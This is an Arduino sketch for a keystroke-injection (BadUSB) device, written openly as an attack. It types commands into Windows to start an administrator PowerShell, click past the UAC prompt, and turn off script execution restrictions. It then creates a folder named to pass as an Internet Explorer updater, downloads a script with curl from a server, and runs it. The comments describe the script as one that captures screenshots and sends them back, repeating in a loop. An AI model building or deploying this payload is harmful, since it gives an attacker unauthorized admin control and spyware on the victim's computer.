#include <Keyboard.h>
int big_delay = 2000, low_delay = 500;


void setup() {
  Keyboard.begin();   //Keyboard library initialization
  delay(10000); 
}

// Enter press emulation
void press_enter(){ 
  Keyboard.press(KEY_RETURN);
  delay(low_delay);
  Keyboard.releaseAll();
  delay(low_delay);
}

// Simpe UAC Bypass by pressing yes
void UAC_bypass(){ 
  delay(big_delay);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(low_delay);
  Keyboard.releaseAll();
  press_enter();
}


void loop() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');

  delay(low_delay);
  Keyboard.releaseAll();
  delay(big_delay);

  Keyboard.println("powershell Start-Process powershell -Verb runAs"); // Here we starts an powershell with admin rights
  UAC_bypass();

  Keyboard.println("Set-ExecutionPolicy -Scope Process Unrestricted -Force"); // Changing execution policy for powershell scripts in os
  press_enter();

  Keyboard.println("mkdir IexplorerUpdater"); // This is implementation of persistence. We make dir, wich look like system
  press_enter();

  Keyboard.println("curl -o IexplorerUpdater/IEUpdater.ps1 http://127.0.0.1:40004"); // Downloading bad code from server
  press_enter();

  Keyboard.println("./IexplorerUpdater/IEUpdater.ps1"); // Here we start our payload wich created screenshoot and send it to server
  press_enter();
  delay(300000); // 30 secunds wait for next execution

}
